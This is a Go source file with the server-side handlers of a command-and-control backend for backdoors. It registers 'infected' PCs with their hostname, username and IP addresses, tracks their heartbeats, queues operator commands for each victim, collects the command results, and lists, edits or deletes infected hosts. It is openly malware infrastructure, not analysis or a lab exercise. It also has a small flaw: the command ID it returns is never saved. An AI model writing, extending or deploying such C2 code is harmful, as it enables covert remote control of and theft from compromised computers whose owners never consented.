package main

import (
	"encoding/json"
	"net/http"
	"strings"

	"github.com/google/uuid"
)

type C2Handler struct {
	DB *D1Client
}

// HandleHeartbeat handles POST /api/c2/heartbeat
// Backdoor calls this periodically. Auto-registers if new PC, updates heartbeat if existing.
func (h *C2Handler) HandleHeartbeat(w http.ResponseWriter, r *http.Request) {
	if r.Method != http.MethodPost {
		writeJSON(w, http.StatusMethodNotAllowed, ErrorResponse{Error: "method not allowed"})
		return
	}

	var req HeartbeatRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, http.StatusBadRequest, ErrorResponse{Error: "invalid JSON body"})
		return
	}
	if req.PCID == "" {
		writeJSON(w, http.StatusBadRequest, ErrorResponse{Error: "pc_id is required"})
		return
	}

	// Check if PC already exists
	var existing []InfectedPC
	h.DB.QueryRows(&existing, "SELECT * FROM infected_pcs WHERE pc_id = ?1", req.PCID)

	if len(existing) == 0 {
		// Register new PC
		_, err := h.DB.Execute(
			`INSERT INTO infected_pcs (pc_id, hostname, username, internal_ip, external_ip, operating_system, architecture, backdoor_version, last_heartbeat, deployment_method)
			 VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8, datetime('now'), ?9)`,
			req.PCID, req.Hostname, req.Username, req.InternalIP, req.ExternalIP,
			req.OperatingSystem, req.Architecture, req.BackdoorVersion, req.DeploymentMethod,
		)
		if err != nil {
			writeJSON(w, http.StatusInternalServerError, ErrorResponse{Error: err.Error()})
			return
		}
		writeJSON(w, http.StatusCreated, APIResponse{Success: true, Message: "registered"})
	} else {
		// Update heartbeat
		_, err := h.DB.Execute(
			`UPDATE infected_pcs SET last_heartbeat = datetime('now'), status = 'active' WHERE pc_id = ?1`,
			req.PCID,
		)
		if err != nil {
			writeJSON(w, http.StatusInternalServerError, ErrorResponse{Error: err.Error()})
			return
		}
		writeJSON(w, http.StatusOK, APIResponse{Success: true, Message: "heartbeat updated"})
	}
}

// HandleCommands handles GET /api/c2/commands/{pc_id}
// Backdoor calls this to get pending commands.
func (h *C2Handler) HandleCommands(w http.ResponseWriter, r *http.Request) {
	pcID := extractPathParam(r.URL.Path, "/api/c2/commands/")
	if pcID == "" {
		writeJSON(w, http.StatusBadRequest, ErrorResponse{Error: "pc_id required in URL path"})
		return
	}

	// Check for /result suffix (command result reporting)
	if strings.HasSuffix(pcID, "/result") {
		pcID = strings.TrimSuffix(pcID, "/result")
		h.handleCommandResult(w, r, pcID)
		return
	}

	if r.Method != http.MethodGet {
		writeJSON(w, http.StatusMethodNotAllowed, ErrorResponse{Error: "method not allowed"})
		return
	}

	var commands []C2CommandLog
	err := h.DB.QueryRows(&commands,
		`SELECT * FROM c2_command_logs WHERE pc_id = ?1 AND status = 'sent' ORDER BY created_at ASC`,
		pcID,
	)
	if err != nil {
		writeJSON(w, http.StatusInternalServerError, ErrorResponse{Error: err.Error()})
		return
	}

	// Mark commands as received
	for _, cmd := range commands {
		h.DB.Execute(`UPDATE c2_command_logs SET status = 'received' WHERE id = ?1`, cmd.ID)
	}

	if commands == nil {
		commands = []C2CommandLog{}
	}
	writeJSON(w, http.StatusOK, APIResponse{Success: true, Data: commands})
}

// handleCommandResult handles POST /api/c2/commands/{pc_id}/result
func (h *C2Handler) handleCommandResult(w http.ResponseWriter, r *http.Request, pcID string) {
	if r.Method != http.MethodPost {
		writeJSON(w, http.StatusMethodNotAllowed, ErrorResponse{Error: "method not allowed"})
		return
	}

	var req struct {
		CommandID int     `json:"command_id"`
		Status    string  `json:"status"`
		Result    *string `json:"result"`
	}
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, http.StatusBadRequest, ErrorResponse{Error: "invalid JSON body"})
		return
	}

	_, err := h.DB.Execute(
		`UPDATE c2_command_logs SET status = ?1, result = ?2, completed_at = datetime('now')
		 WHERE id = ?3 AND pc_id = ?4`,
		req.Status, req.Result, req.CommandID, pcID,
	)
	if err != nil {
		writeJSON(w, http.StatusInternalServerError, ErrorResponse{Error: err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, APIResponse{Success: true, Message: "command result recorded"})
}

// HandleInfected handles GET/PATCH/DELETE /api/c2/infected and POST /api/c2/infected/{pc_id}/command
func (h *C2Handler) HandleInfected(w http.ResponseWriter, r *http.Request) {
	// Check if this is a command send request: /api/c2/infected/{pc_id}/command
	subPath := strings.TrimPrefix(r.URL.Path, "/api/c2/infected")
	if strings.HasSuffix(subPath, "/command") {
		pcID := strings.TrimSuffix(strings.TrimPrefix(subPath, "/"), "/command")
		h.sendCommand(w, r, pcID)
		return
	}

	switch r.Method {
	case http.MethodGet:
		h.listInfected(w, r)
	case http.MethodPatch:
		h.updateInfected(w, r)
	case http.MethodDelete:
		h.deleteInfected(w, r)
	default:
		writeJSON(w, http.StatusMethodNotAllowed, ErrorResponse{Error: "method not allowed"})
	}
}

func (h *C2Handler) listInfected(w http.ResponseWriter, r *http.Request) {
	query := "SELECT * FROM infected_pcs ORDER BY last_heartbeat DESC"
	params := []interface{}{}

	if status := r.URL.Query().Get("status"); status != "" {
		query = "SELECT * FROM infected_pcs WHERE status = ?1 ORDER BY last_heartbeat DESC"
		params = append(params, status)
	}

	var pcs []InfectedPC
	if err := h.DB.QueryRows(&pcs, query, params...); err != nil {
		writeJSON(w, http.StatusInternalServerError, ErrorResponse{Error: err.Error()})
		return
	}
	if pcs == nil {
		pcs = []InfectedPC{}
	}
	writeJSON(w, http.StatusOK, APIResponse{Success: true, Data: pcs})
}

func (h *C2Handler) updateInfected(w http.ResponseWriter, r *http.Request) {
	pcID := extractPathParam(r.URL.Path, "/api/c2/infected/")
	if pcID == "" {
		writeJSON(w, http.StatusBadRequest, ErrorResponse{Error: "pc_id required in URL path"})
		return
	}

	var req UpdateInfectedPCRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, http.StatusBadRequest, ErrorResponse{Error: "invalid JSON body"})
		return
	}

	setClauses := []string{}
	params := []interface{}{}
	paramIdx := 1

	if req.Status != nil {
		setClauses = append(setClauses, "status = ?"+itoa(paramIdx))
		params = append(params, *req.Status)
		paramIdx++
	}
	if req.Notes != nil {
		setClauses = append(setClauses, "notes = ?"+itoa(paramIdx))
		params = append(params, *req.Notes)
		paramIdx++
	}

	if len(setClauses) == 0 {
		writeJSON(w, http.StatusBadRequest, ErrorResponse{Error: "no fields to update"})
		return
	}

	sql := "UPDATE infected_pcs SET " + strings.Join(setClauses, ", ") + " WHERE pc_id = ?" + itoa(paramIdx)
	params = append(params, pcID)

	_, err := h.DB.Execute(sql, params...)
	if err != nil {
		writeJSON(w, http.StatusInternalServerError, ErrorResponse{Error: err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, APIResponse{Success: true, Message: "infected PC updated"})
}

func (h *C2Handler) deleteInfected(w http.ResponseWriter, r *http.Request) {
	pcID := extractPathParam(r.URL.Path, "/api/c2/infected/")
	if pcID == "" {
		writeJSON(w, http.StatusBadRequest, ErrorResponse{Error: "pc_id required in URL path"})
		return
	}

	_, err := h.DB.Execute("DELETE FROM infected_pcs WHERE pc_id = ?1", pcID)
	if err != nil {
		writeJSON(w, http.StatusInternalServerError, ErrorResponse{Error: err.Error()})
		return
	}
	writeJSON(w, http.StatusOK, APIResponse{Success: true, Message: "infected PC removed"})
}

// sendCommand creates a new C2 command for a backdoor.
// POST /api/c2/infected/{pc_id}/command
func (h *C2Handler) sendCommand(w http.ResponseWriter, r *http.Request, pcID string) {
	if r.Method != http.MethodPost {
		writeJSON(w, http.StatusMethodNotAllowed, ErrorResponse{Error: "method not allowed"})
		return
	}

	var req SendCommandRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		writeJSON(w, http.StatusBadRequest, ErrorResponse{Error: "invalid JSON body"})
		return
	}
	if req.CommandType == "" {
		writeJSON(w, http.StatusBadRequest, ErrorResponse{Error: "command_type is required"})
		return
	}

	commandID := uuid.New().String()
	_, err := h.DB.Execute(
		`INSERT INTO c2_command_logs (pc_id, command_type, command_data)
		 VALUES (?1, ?2, ?3)`,
		pcID, req.CommandType, req.CommandData,
	)
	if err != nil {
		writeJSON(w, http.StatusInternalServerError, ErrorResponse{Error: err.Error()})
		return
	}

	writeJSON(w, http.StatusCreated, APIResponse{Success: true, Data: map[string]string{"command_id": commandID}})
}
